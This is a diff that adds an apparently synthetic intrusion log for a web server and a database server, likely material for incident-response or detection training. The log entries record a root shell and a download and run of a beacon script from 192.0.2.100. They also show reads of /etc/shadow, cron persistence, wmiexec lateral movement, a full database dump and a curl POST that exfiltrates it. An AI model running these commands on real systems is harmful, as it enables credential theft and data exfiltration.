@@ -1,0 +1,16 @@
+[10.0.5.20 - Web Server]
+2025-09-15 02:15:02 NEW_PROCESS: /bin/bash -i (parent: sshd, user: root)
+2025-09-15 02:15:10 NEW_PROCESS: curl http://192.0.2.100/tools/beacon.sh (user: root)
+2025-09-15 02:15:12 FILE_CREATED: /tmp/.beacon.sh (hidden file)
+2025-09-15 02:15:13 NEW_PROCESS: chmod +x /tmp/.beacon.sh (user: root)
+2025-09-15 02:15:15 NEW_PROCESS: /tmp/.beacon.sh (user: root)
+2025-09-15 02:16:00 NEW_PROCESS: cat /etc/shadow (user: root)
+2025-09-15 02:16:30 NEW_PROCESS: cat /etc/passwd (user: root)
+2025-09-15 02:17:00 REGISTRY_PERSISTENCE: crontab -e (added beacon to cron)
+2025-09-15 02:20:10 NEW_PROCESS: wmiexec.py 10.0.5.30 (lateral movement tool)
+
+[10.0.5.30 - Database Server]
+2025-09-15 02:20:15 NEW_PROCESS: cmd.exe /c whoami (user: SYSTEM)
+2025-09-15 02:21:00 NEW_PROCESS: mysqldump --all-databases > /tmp/dump.sql (user: SYSTEM)
+2025-09-15 02:23:00 FILE_CREATED: /tmp/dump.sql.gz (2.3GB compressed)
+2025-09-15 02:24:00 NEW_PROCESS: curl -X POST https://192.0.2.100/exfil -F file=@/tmp/dump.sql.gz
